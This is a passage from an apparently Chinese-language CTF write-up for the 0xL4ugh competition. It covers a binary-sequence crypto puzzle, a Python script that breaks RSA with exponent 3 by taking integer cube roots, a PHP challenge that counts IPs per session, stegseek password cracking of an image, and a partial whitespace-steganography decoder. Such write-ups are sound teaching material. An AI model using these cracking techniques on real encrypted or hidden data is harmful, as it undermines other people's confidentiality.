class="hljs-number">442253038315643377831027123222653308452492178</span>, <span class="hljs-number">884506076631286755662054246445306616904984356</span>, <span class="hljs-number">1769012153262573511324108492890613233809968711</span>, <span class="hljs-number">3538024306525147022648216985781226467619937423</span>, <span class="hljs-number">7076048613050294045296433971562452935239874845</span>, <span class="hljs-number">14152097226100588090592867943124905870479749691</span>, <span class="hljs-number">28304194452201176181185735886249811740959499382</span>, <span class="hljs-number">56608388904402352362371471772499623481918998764</span>, <span class="hljs-number">113216777808804704724742943544999246963837997528</span>, <span class="hljs-number">226433555617609409449485887089998493927675995056</span>, <span class="hljs-number">452867111235218818898971774179996987855351990111</span>, <span class="hljs-number">905734222470437637797943548359993975710703980222</span>, <span class="hljs-number">1811468444940875275595887096719987951421407960445</span>, <span class="hljs-number">3622936889881750551191774193439975902842815920890</span>, <span class="hljs-number">7245873779763501102383548386879951805685631841779</span>, <span class="hljs-number">14491747559527002204767096773759903611371263683559</span>, <span class="hljs-number">28983495119054004409534193547519807222742527367117</span>, <span class="hljs-number">57966990238108008819068387095039614445485054734235</span>, <span class="hljs-number">115933980476216017638136774190079228890970109468469</span>, <span class="hljs-number">231867960952432035276273548380158457781940218936938</span>, <span class="hljs-number">463735921904864070552547096760316915563880437873877</span>, <span class="hljs-number">927471843809728141105094193520633831127760875747754</span>, <span class="hljs-number">1854943687619456282210188387041267662255521751495507</span>, <span class="hljs-number">3709887375238912564420376774082535324511043502991014</span>, <span class="hljs-number">7419774750477825128840753548165070649022087005982029</span>, <span class="hljs-number">14839549500955650257681507096330141298044174011964058</span>, <span class="hljs-number">29679099001911300515363014192660282596088348023928115</span>, <span class="hljs-number">59358198003822601030726028385320565192176696047856231</span>, <span class="hljs-number">118716396007645202061452056770641130384353392095712461</span>, <span class="hljs-number">237432792015290404122904113541282260768706784191424923</span>, <span class="hljs-number">474865584030580808245808227082564521537413568382849845</span>, <span class="hljs-number">949731168061161616491616454165129043074827136765699690</span>, <span class="hljs-number">1899462336122323232983232908330258086149654273531399380</span>, <span class="hljs-number">3798924672244646465966465816660516172299308547062798761</span>, <span class="hljs-number">7597849344489292931932931633321032344598617094125597521</span>, <span class="hljs-number">15195698688978585863865863266642064689197234188251195043</span>, <span class="hljs-number">30391397377957171727731726533284129378394468376502390085</span>, <span class="hljs-number">60782794755914343455463453066568258756788936753004780171</span>, <span class="hljs-number">121565589511828686910926906133136517513577873506009560341</span>, <span class="hljs-number">243131179023657373821853812266273035027155747012019120683</span>, <span class="hljs-number">486262358047314747643707624532546070054311494024038241365</span>, <span class="hljs-number">972524716094629495287415249065092140108622988048076482731</span>, <span class="hljs-number">1945049432189258990574830498130184280217245976096152965461</span>, <span class="hljs-number">3890098864378517981149660996260368560434491952192305930922</span>, <span class="hljs-number">7780197728757035962299321992520737120868983904384611861845</span>, <span class="hljs-number">15560395457514071924598643985041474241737967808769223723690</span>, <span class="hljs-number">31120790915028143849197287970082948483475935617538447447379</span>, <span class="hljs-number">62241581830056287698394575940165896966951871235076894894758</span>, <span class="hljs-number">124483163660112575396789151880331793933903742470153789789517</span>, <span class="hljs-number">248966327320225150793578303760663587867807484940307579579034</span>, <span class="hljs-number">497932654640450301587156607521327175735614969880615159158067</span>, <span class="hljs-number">995865309280900603174313215042654351471229939761230318316135</span>, <span class="hljs-number">1991730618561801206348626430085308702942459879522460636632269</span>, <span class="hljs-number">3983461237123602412697252860170617405884919759044921273264538</span>, <span class="hljs-number">7966922474247204825394505720341234811769839518089842546529077</span>, <span class="hljs-number">15933844948494409650789011440682469623539679036179685093058154</span>, <span class="hljs-number">31867689896988819301578022881364939247079358072359370186116308</span>, <span class="hljs-number">63735379793977638603156045762729878494158716144718740372232615</span>, <span class="hljs-number">127470759587955277206312091525459756988317432289437480744465230</span>, <span class="hljs-number">254941519175910554412624183050919513976634864578874961488930461</span>, <span class="hljs-number">509883038351821108825248366101839027953269729157749922977860921</span>, <span class="hljs-number">1019766076703642217650496732203678055906539458315499845955721842</span>, <span class="hljs-number">2039532153407284435300993464407356111813078916630999691911443684</span>, <span class="hljs-number">4079064306814568870601986928814712223626157833261999383822887368</span>, <span class="hljs-number">8158128613629137741203973857629424447252315666523998767645774737</span>, <span class="hljs-number">16316257227258275482407947715258848894504631333047997535291549474</span>, <span class="hljs-number">32632514454516550964815895430517697789009262666095995070583098947</span>, <span class="hljs-number">65265028909033101929631790861035395578018525332191990141166197894</span>, <span class="hljs-number">130530057818066203859263581722070791156037050664383980282332395789</span>, <span class="hljs-number">261060115636132407718527163444141582312074101328767960564664791578</span>, <span class="hljs-number">522120231272264815437054326888283164624148202657535921129329583155</span>, <span class="hljs-number">1044240462544529630874108653776566329248296405315071842258659166310</span>, <span class="hljs-number">2088480925089059261748217307553132658496592810630143684517318332621</span>, <span class="hljs-number">4176961850178118523496434615106265316993185621260287369034636665242</span>, <span class="hljs-number">8353923700356237046992869230212530633986371242520574738069273330483</span>, <span class="hljs-number">16707847400712474093985738460425061267972742485041149476138546660967</span>, <span class="hljs-number">33415694801424948187971476920850122535945484970082298952277093321934</span>, <span class="hljs-number">66831389602849896375942953841700245071890969940164597904554186643868</span>, <span class="hljs-number">133662779205699792751885907683400490143781939880329195809108373287736</span>, <span class="hljs-number">267325558411399585503771815366800980287563879760658391618216746575472</span>, <span class="hljs-number">534651116822799171007543630733601960575127759521316783236433493150943</span>, <span class="hljs-number">1069302233645598342015087261467203921150255519042633566472866986301887</span>]<br></code></pre></td></tr></table></figure><p>一个规律：<br>从第2个数开始，每个数与前面的数之和的差总为0或者1，由此可以得到2进制数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">ct = [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">40</span>, <span class="hljs-number">79</span>, <span class="hljs-number">159</span>, <span class="hljs-number">317</span>, <span class="hljs-number">635</span>, <span class="hljs-number">1269</span>, <span class="hljs-number">2538</span>, <span class="hljs-number">5077</span>, <span class="hljs-number">10154</span>, <span class="hljs-number">20307</span>, <span class="hljs-number">40615</span>, <span class="hljs-number">81229</span>, <span class="hljs-number">162458</span>, <span class="hljs-number">324916</span>, <span class="hljs-number">649832</span>, <span class="hljs-number">1299665</span>, <span class="hljs-number">2599330</span>, <span class="hljs-number">5198659</span>, <span class="hljs-number">10397319</span>, <span class="hljs-number">20794638</span>, <span class="hljs-number">41589276</span>, <span class="hljs-number">83178552</span>, <span class="hljs-number">166357103</span>, <span class="hljs-number">332714207</span>, <span class="hljs-number">665428414</span>, <span class="hljs-number">1330856827</span>, <span class="hljs-number">2661713655</span>, <span class="hljs-number">5323427309</span>, <span class="hljs-number">10646854619</span>, <span class="hljs-number">21293709237</span>, <span class="hljs-number">42587418474</span>, <span class="hljs-number">85174836949</span>, <span class="hljs-number">170349673898</span>, <span class="hljs-number">340699347795</span>, <span class="hljs-number">681398695591</span>, <span class="hljs-number">1362797391181</span>, <span class="hljs-number">2725594782363</span>, <span class="hljs-number">5451189564725</span>, <span class="hljs-number">10902379129451</span>, <span class="hljs-number">21804758258901</span>, <span class="hljs-number">43609516517803</span>, <span class="hljs-number">87219033035605</span>, <span class="hljs-number">174438066071211</span>, <span class="hljs-number">348876132142421</span>, <span class="hljs-number">697752264284843</span>, <span class="hljs-number">1395504528569685</span>, <span class="hljs-number">2791009057139370</span>, <span class="hljs-number">5582018114278740</span>, <span class="hljs-number">11164036228557480</span>, <span class="hljs-number">22328072457114960</span>, <span class="hljs-number">44656144914229920</span>, <span class="hljs-number">89312289828459841</span>, <span class="hljs-number">178624579656919682</span>, <span class="hljs-number">357249159313839363</span>, <span class="hljs-number">714498318627678726</span>, <span class="hljs-number">1428996637255357453</span>, <span class="hljs-number">2857993274510714906</span>, <span class="hljs-number">5715986549021429811</span>, <span class="hljs-number">11431973098042859623</span>, <span class="hljs-number">22863946196085719246</span>, <span class="hljs-number">45727892392171438492</span>, <span class="hljs-number">91455784784342876983</span>, <span class="hljs-number">182911569568685753966</span>, <span class="hljs-number">365823139137371507933</span>, <span class="hljs-number">731646278274743015865</span>, <span class="hljs-number">1463292556549486031730</span>, <span class="hljs-number">2926585113098972063460</span>, <span class="hljs-number">5853170226197944126921</span>, <span class="hljs-number">11706340452395888253841</span>, <span class="hljs-number">23412680904791776507682</span>, <span class="hljs-number">46825361809583553015364</span>, <span class="hljs-number">93650723619167106030728</span>, <span class="hljs-number">187301447238334212061457</span>, <span class="hljs-number">374602894476668424122913</span>, <span class="hljs-number">749205788953336848245827</span>, <span class="hljs-number">1498411577906673696491653</span>, <span class="hljs-number">2996823155813347392983306</span>, <span class="hljs-number">5993646311626694785966613</span>, <span class="hljs-number">11987292623253389571933226</span>, <span class="hljs-number">23974585246506779143866452</span>, <span class="hljs-number">47949170493013558287732903</span>, <span class="hljs-number">95898340986027116575465806</span>, <span class="hljs-number">191796681972054233150931613</span>, <span class="hljs-number">383593363944108466301863225</span>, <span class="hljs-number">767186727888216932603726450</span>, <span class="hljs-number">1534373455776433865207452900</span>, <span class="hljs-number">3068746911552867730414905800</span>, <span class="hljs-number">6137493823105735460829811601</span>, <span class="hljs-number">12274987646211470921659623202</span>, <span class="hljs-number">24549975292422941843319246403</span>, <span class="hljs-number">49099950584845883686638492807</span>, <span class="hljs-number">98199901169691767373276985614</span>, <span class="hljs-number">196399802339383534746553971228</span>, <span class="hljs-number">392799604678767069493107942455</span>, <span class="hljs-number">785599209357534138986215884910</span>, <span class="hljs-number">1571198418715068277972431769821</span>, <span class="hljs-number">3142396837430136555944863539641</span>, <span class="hljs-number">6284793674860273111889727079282</span>, <span class="hljs-number">12569587349720546223779454158564</span>, <span class="hljs-number">25139174699441092447558908317129</span>, <span class="hljs-number">50278349398882184895117816634258</span>, <span class="hljs-number">100556698797764369790235633268515</span>, <span class="hljs-number">201113397595528739580471266537030</span>, <span class="hljs-number">402226795191057479160942533074061</span>, <span class="hljs-number">804453590382114958321885066148122</span>, <span class="hljs-number">1608907180764229916643770132296243</span>, <span class="hljs-number">3217814361528459833287540264592486</span>, <span class="hljs-number">6435628723056919666575080529184973</span>, <span class="hljs-number">12871257446113839333150161058369946</span>, <span class="hljs-number">25742514892227678666300322116739891</span>, <span class="hljs-number">51485029784455357332600644233479783</span>, <span class="hljs-number">102970059568910714665201288466959565</span>, <span class="hljs-number">205940119137821429330402576933919130</span>, <span class="hljs-number">411880238275642858660805153867838260</span>, <span class="hljs-number">823760476551285717321610307735676520</span>, <span class="hljs-number">1647520953102571434643220615471353041</span>, <span class="hljs-number">3295041906205142869286441230942706082</span>, <span class="hljs-number">6590083812410285738572882461885412163</span>, <span class="hljs-number">13180167624820571477145764923770824327</span>, <span class="hljs-number">26360335249641142954291529847541648653</span>, <span class="hljs-number">52720670499282285908583059695083297307</span>, <span class="hljs-number">105441340998564571817166119390166594613</span>, <span class="hljs-number">210882681997129143634332238780333189226</span>, <span class="hljs-number">421765363994258287268664477560666378453</span>, <span class="hljs-number">843530727988516574537328955121332756906</span>, <span class="hljs-number">1687061455977033149074657910242665513811</span>, <span class="hljs-number">3374122911954066298149315820485331027622</span>, <span class="hljs-number">6748245823908132596298631640970662055244</span>, <span class="hljs-number">13496491647816265192597263281941324110489</span>, <span class="hljs-number">26992983295632530385194526563882648220977</span>, <span class="hljs-number">53985966591265060770389053127765296441955</span>, <span class="hljs-number">107971933182530121540778106255530592883909</span>, <span class="hljs-number">215943866365060243081556212511061185767818</span>, <span class="hljs-number">431887732730120486163112425022122371535637</span>, <span class="hljs-number">863775465460240972326224850044244743071274</span>, <span class="hljs-number">1727550930920481944652449700088489486142548</span>, <span class="hljs-number">3455101861840963889304899400176978972285095</span>, <span class="hljs-number">6910203723681927778609798800353957944570190</span>, <span class="hljs-number">13820407447363855557219597600707915889140381</span>, <span class="hljs-number">27640814894727711114439195201415831778280761</span>, <span class="hljs-number">55281629789455422228878390402831663556561522</span>, <span class="hljs-number">110563259578910844457756780805663327113123044</span>, <span class="hljs-number">221126519157821688915513561611326654226246089</span>, <span class="hljs-number">442253038315643377831027123222653308452492178</span>, <span class="hljs-number">884506076631286755662054246445306616904984356</span>, <span class="hljs-number">1769012153262573511324108492890613233809968711</span>, <span class="hljs-number">3538024306525147022648216985781226467619937423</span>, <span class="hljs-number">7076048613050294045296433971562452935239874845</span>, <span class="hljs-number">14152097226100588090592867943124905870479749691</span>, <span class="hljs-number">28304194452201176181185735886249811740959499382</span>, <span class="hljs-number">56608388904402352362371471772499623481918998764</span>, <span class="hljs-number">113216777808804704724742943544999246963837997528</span>, <span class="hljs-number">226433555617609409449485887089998493927675995056</span>, <span class="hljs-number">452867111235218818898971774179996987855351990111</span>, <span class="hljs-number">905734222470437637797943548359993975710703980222</span>, <span class="hljs-number">1811468444940875275595887096719987951421407960445</span>, <span class="hljs-number">3622936889881750551191774193439975902842815920890</span>, <span class="hljs-number">7245873779763501102383548386879951805685631841779</span>, <span class="hljs-number">14491747559527002204767096773759903611371263683559</span>, <span class="hljs-number">28983495119054004409534193547519807222742527367117</span>, <span class="hljs-number">57966990238108008819068387095039614445485054734235</span>, <span class="hljs-number">115933980476216017638136774190079228890970109468469</span>, <span class="hljs-number">231867960952432035276273548380158457781940218936938</span>, <span class="hljs-number">463735921904864070552547096760316915563880437873877</span>, <span class="hljs-number">927471843809728141105094193520633831127760875747754</span>, <span class="hljs-number">1854943687619456282210188387041267662255521751495507</span>, <span class="hljs-number">3709887375238912564420376774082535324511043502991014</span>, <span class="hljs-number">7419774750477825128840753548165070649022087005982029</span>, <span class="hljs-number">14839549500955650257681507096330141298044174011964058</span>, <span class="hljs-number">29679099001911300515363014192660282596088348023928115</span>, <span class="hljs-number">59358198003822601030726028385320565192176696047856231</span>, <span class="hljs-number">118716396007645202061452056770641130384353392095712461</span>, <span class="hljs-number">237432792015290404122904113541282260768706784191424923</span>, <span class="hljs-number">474865584030580808245808227082564521537413568382849845</span>, <span class="hljs-number">949731168061161616491616454165129043074827136765699690</span>, <span class="hljs-number">1899462336122323232983232908330258086149654273531399380</span>, <span class="hljs-number">3798924672244646465966465816660516172299308547062798761</span>, <span class="hljs-number">7597849344489292931932931633321032344598617094125597521</span>, <span class="hljs-number">15195698688978585863865863266642064689197234188251195043</span>, <span class="hljs-number">30391397377957171727731726533284129378394468376502390085</span>, <span class="hljs-number">60782794755914343455463453066568258756788936753004780171</span>, <span class="hljs-number">121565589511828686910926906133136517513577873506009560341</span>, <span class="hljs-number">243131179023657373821853812266273035027155747012019120683</span>, <span class="hljs-number">486262358047314747643707624532546070054311494024038241365</span>, <span class="hljs-number">972524716094629495287415249065092140108622988048076482731</span>, <span class="hljs-number">1945049432189258990574830498130184280217245976096152965461</span>, <span class="hljs-number">3890098864378517981149660996260368560434491952192305930922</span>, <span class="hljs-number">7780197728757035962299321992520737120868983904384611861845</span>, <span class="hljs-number">15560395457514071924598643985041474241737967808769223723690</span>, <span class="hljs-number">31120790915028143849197287970082948483475935617538447447379</span>, <span class="hljs-number">62241581830056287698394575940165896966951871235076894894758</span>, <span class="hljs-number">124483163660112575396789151880331793933903742470153789789517</span>, <span class="hljs-number">248966327320225150793578303760663587867807484940307579579034</span>, <span class="hljs-number">497932654640450301587156607521327175735614969880615159158067</span>, <span class="hljs-number">995865309280900603174313215042654351471229939761230318316135</span>, <span class="hljs-number">1991730618561801206348626430085308702942459879522460636632269</span>, <span class="hljs-number">3983461237123602412697252860170617405884919759044921273264538</span>, <span class="hljs-number">7966922474247204825394505720341234811769839518089842546529077</span>, <span class="hljs-number">15933844948494409650789011440682469623539679036179685093058154</span>, <span class="hljs-number">31867689896988819301578022881364939247079358072359370186116308</span>, <span class="hljs-number">63735379793977638603156045762729878494158716144718740372232615</span>, <span class="hljs-number">127470759587955277206312091525459756988317432289437480744465230</span>, <span class="hljs-number">254941519175910554412624183050919513976634864578874961488930461</span>, <span class="hljs-number">509883038351821108825248366101839027953269729157749922977860921</span>, <span class="hljs-number">1019766076703642217650496732203678055906539458315499845955721842</span>, <span class="hljs-number">2039532153407284435300993464407356111813078916630999691911443684</span>, <span class="hljs-number">4079064306814568870601986928814712223626157833261999383822887368</span>, <span class="hljs-number">8158128613629137741203973857629424447252315666523998767645774737</span>, <span class="hljs-number">16316257227258275482407947715258848894504631333047997535291549474</span>, <span class="hljs-number">32632514454516550964815895430517697789009262666095995070583098947</span>, <span class="hljs-number">65265028909033101929631790861035395578018525332191990141166197894</span>, <span class="hljs-number">130530057818066203859263581722070791156037050664383980282332395789</span>, <span class="hljs-number">261060115636132407718527163444141582312074101328767960564664791578</span>, <span class="hljs-number">522120231272264815437054326888283164624148202657535921129329583155</span>, <span class="hljs-number">1044240462544529630874108653776566329248296405315071842258659166310</span>, <span class="hljs-number">2088480925089059261748217307553132658496592810630143684517318332621</span>, <span class="hljs-number">4176961850178118523496434615106265316993185621260287369034636665242</span>, <span class="hljs-number">8353923700356237046992869230212530633986371242520574738069273330483</span>, <span class="hljs-number">16707847400712474093985738460425061267972742485041149476138546660967</span>, <span class="hljs-number">33415694801424948187971476920850122535945484970082298952277093321934</span>, <span class="hljs-number">66831389602849896375942953841700245071890969940164597904554186643868</span>, <span class="hljs-number">133662779205699792751885907683400490143781939880329195809108373287736</span>, <span class="hljs-number">267325558411399585503771815366800980287563879760658391618216746575472</span>, <span class="hljs-number">534651116822799171007543630733601960575127759521316783236433493150943</span>, <span class="hljs-number">1069302233645598342015087261467203921150255519042633566472866986301887</span>]<br>x = <span class="hljs-number">0</span><br>y = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">len</span>(ct)):<br>   y += <span class="hljs-built_in">str</span>(ct[i]-x)<br>   x += ct[i]<br><span class="hljs-built_in">print</span>(y)<br><span class="hljs-comment">#100111101010011010000110111101101010011010101010101000000110011011100100010000101001110010000110111001000110011001101000011010100110001010011100100011101011111001101010011001101010001010101010011001101001110010000110011001101111101</span><br><br></code></pre></td></tr></table></figure><p>发现只有231位，前面要补一个0<br><img src="/mdimg/0xl4/15.png"></p><h3 id="Crypto-2"><a href="#Crypto-2" class="headerlink" title="Crypto 2"></a>Crypto 2</h3><h4 id="题目说明-2"><a href="#题目说明-2" class="headerlink" title="题目说明"></a>题目说明</h4><p>the professor asked the students to write a paragraph of a story each and submit it by email. But some students copied answers!<br>format : OSC{}</p><h4 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long, getPrime<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> messages<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">RSA_encrypt</span>(<span class="hljs-params">message</span>):<br>    m = bytes_to_long(message)<br>    p = getPrime(<span class="hljs-number">1024</span>)<br>    q = getPrime(<span class="hljs-number">1024</span>)<br>    N = p * q<br>    e = <span class="hljs-number">3</span><br>    c = <span class="hljs-built_in">pow</span>(m, e, N)<br>    <span class="hljs-keyword">return</span> N, e, c<br><br><br><span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> messages:<br>    N, e, c = RSA_encrypt(m)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;n = <span class="hljs-subst">&#123;N&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;e = <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;c = <span class="hljs-subst">&#123;c&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>显然低加密指数攻击</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">import</span> gmpy2<br>n = <span class="hljs-number">16691865792147194697602300512532851182049374635648801189035809706515463120586646192481229145243032049569188562652509317620313234450062651687702398851985141210252080200118496555573100538082230667123330012596663673730204381449416210246747100065137562877723883087453655498192797717322414163929033958154847172474876805828355467779563924126108244847992313964795565023554963296215243179420547862638306573737884301209065640499511319512400331964327680966267406302192650421152395257843371809022919488155958420254813754963104236903270765037373600427365083337259089056941701762267110792581437924801009323096077817633370816094073</span><br>e = <span class="hljs-number">3</span><br>c = <span class="hljs-number">527715545190279160683427564102415343921040361668522479441727171363460126920288425567651662947621100428078618585624707291232885706132068328305084115992340337032439274527186826778447854890982475878955397378947713414201050357209397140391734937299379698886378260075489810871914081834819238233619226377140629000968272406078503709732856007314599153696811725183993977424740513321277346005097500256459835713834182894305536107589525724571208098322359262186595358977825573193007799376102473240254372327730839223120373818874006086733633525830272119104666835113980722223258389364156995110666626033474727892354233040278510447646</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>(<span class="hljs-params">n, e, c</span>):<br>    k = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        m1 = k * n + c<br>        m, t = gmpy2.iroot(m1, e)<br>        <span class="hljs-keyword">if</span> t:<br>            <span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(m)))<br>            <span class="hljs-keyword">break</span><br>        k += <span class="hljs-number">1</span><br><br>exp(n, e, c)<br><span class="hljs-comment">#b&#x27;OSC&#123;C0N6r47U14710N5!_Y0U_UND3r574ND_H0W_70_U53_H4574D5_8r04DC457_4774CK_______0xL4ugh&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Detected"><a href="#Detected" class="headerlink" title="Detected"></a>Detected</h3><h4 id="题目说明-3"><a href="#题目说明-3" class="headerlink" title="题目说明"></a>题目说明</h4><p>Can you be undetected ?</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;?php<br>session_start();<br>$servername = <span class="hljs-string">&quot;localhost&quot;</span>;<br>$username = <span class="hljs-string">&quot;root&quot;</span>;<br>$dbname = <span class="hljs-string">&quot;ctf_test&quot;</span>;<br>$password = <span class="hljs-string">&quot;&quot;</span>;<br>// Create connection<br>$conn = new mysqli($servername, $username, $password,$dbname);<br><br>// Check connection<br><span class="hljs-keyword">if</span> ($conn-&gt;connect_error) &#123;<br>    die(<span class="hljs-string">&quot;Connection failed: &quot;</span> . $conn-&gt;connect_error);<br>&#125;<br><br>$session=mysqli_real_escape_string($conn,$_COOKIE[<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>]);<br>$ip=$_SERVER[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>];<br><br><br><br><br>$conn-&gt;query(<span class="hljs-string">&quot;INSERT into misc (ip,phpsess)values(&#x27;$ip&#x27;,&#x27;$session&#x27;)&quot;</span>);<br><br><span class="hljs-keyword">if</span>($conn-&gt;query(<span class="hljs-string">&quot;select Distinct ip from misc where phpsess=&#x27;$session&#x27;&quot;</span>)-&gt;num_rows &gt;<span class="hljs-number">20</span>)<br>&#123;<br>    echo <span class="hljs-string">&quot;Flag&#123;here&#125;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    echo <span class="hljs-string">&quot;Still Not 20 ip yet :D&quot;</span>;<br>&#125;<br><br><br>?&gt;<br></code></pre></td></tr></table></figure><h4 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h4><p>打开就看到了flag<br><img src="/mdimg/0xl4/6.png"></p><h3 id="welcome"><a href="#welcome" class="headerlink" title="welcome"></a>welcome</h3><h4 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h4><p><code>0xL4ugh&#123;W3LC0ME_T0_0UR_C7F_FREE_PALESTINE&#125;</code></p><h2 id="Steganography"><a href="#Steganography" class="headerlink" title="Steganography"></a>Steganography</h2><h3 id="Uraa"><a href="#Uraa" class="headerlink" title="Uraa"></a>Uraa</h3><h4 id="题目说明-4"><a href="#题目说明-4" class="headerlink" title="题目说明"></a>题目说明</h4><p>I love Urahara. he keeps hiding the secrets.</p><h4 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路"></a>解题思路</h4><p><a href="https://github.com/RickdeJager/stegseek/releases/tag/v0.6">https://github.com/RickdeJager/stegseek/releases/tag/v0.6</a><br>下载deb包<br>安装：<br><code>sudo apt install ./stegseek_0.6-1.deb </code><br><code>stegseek --crack ./Uraa.jpg</code><br><img src="/mdimg/0xl4/7.png"><br><img src="/mdimg/0xl4/8.png"></p><h3 id="Zar"><a href="#Zar" class="headerlink" title="Zar"></a>Zar</h3><h4 id="题目说明-5"><a href="#题目说明-5" class="headerlink" title="题目说明"></a>题目说明</h4><p>Fast as zaraki boi. try to find him.</p><h4 id="解题思路-8"><a href="#解题思路-8" class="headerlink" title="解题思路"></a>解题思路</h4><p><img src="/mdimg/0xl4/9.png"><br>20转0，09转1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">flag=<span class="hljs-string">&#x27;20 20 20 20 09 09 20 20 20 20 0D 0A 09 0D 0A 20 20 20 20 20 09 09 09 09 20 20 20 0D 0A 09 0D 0A 20 20 20 20 20 09 20 20 09 09 20 20 0D 0A 09 0D 0A 20 20 20 20 20 20 09 09 20 09 20 20 0D 0A 09 0D 0A 20 20 20 20 20 09 09 09 20 09 20 09 0D 0A 09 0D 0A 20 20 20 20 20 09 09 20 20 09 09 09 0D 0A 09 0D 0A 20 20 20 20 20 09 09 20 09 20 20 20 0D 0A 09 0D 0A 20 20 20 20 20 09 09 09 09 20 09 09 0D 0A 09 0D 0A 20 20 20 20 20 09 20 20 20 09 09 20 0D 0A 09 0D 0A 20 20 20 20 20 20 09 09 20 09 20 20 0D 0A 09 0D 0A 20 20 20 20 20 09 20 09 20 20 09 09 0D 0A 09 0D 0A 20 20 20 20 20 20 09 09 20 09 20 09 0D 0A 09 0D 0A 20 20 20 20 20 09 20 09 09 09 09 09 0D 0A 09 0D 0A 20 20 20 20 20 20 09 09 20 09 20 20 0D 0A 09 0D 0A 20 20 20 20 20 20 09 09 20 09 20 09 0D 0A 09 0D 0A 20 20 20 20 20 09 20 09 09 09 09 09 0D 0A 09 0D 0A 20 20 20 20 20 09 20 09 09 20 09 20 0D 0A 09 0D 0A 20 20 20 20 20 20 09 09 20 09 20 20 0D 0A 09 0D 0A 20 20 20 20 20 09 20 09 20 20 09 20 0D 0A 09 0D 0A 20 20 20 20 20 20 09 09 20 09 20 20 0D 0A 09 0D 0A 20 20 20 20 20 09 20 20 09 20 09 09 0D 0A 09 0D 0A 20 20 20 20 20 20 09 09 20 20 20 09 0D 0A 09 0D 0A 20 20 20 20 20 09 20 09 09 09 09 09 0D 0A 09 0D 0A 20 20 20 20 20 09 20 20 20 20 09 20 0D 0A 09 0D 0A 20 20 20 20 20 20 09 09 20 20 20 20 0D 0A 09 0D 0A 20 20 20 20 20 09 20 20 09 20 20 09 0D 0A 09 0D 0A 20 20 20 20 20 09 09 09 09 09 20 09 0D 0A 09 0D 0A 20 20 0D 0A 0D 0A 0D 0A&#x27;</span><br><br>a=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag.split(<span class="hljs-string">&#x27; &#x27;</span>):<br>    <span class="hljs-keyword">if</span> i == <span 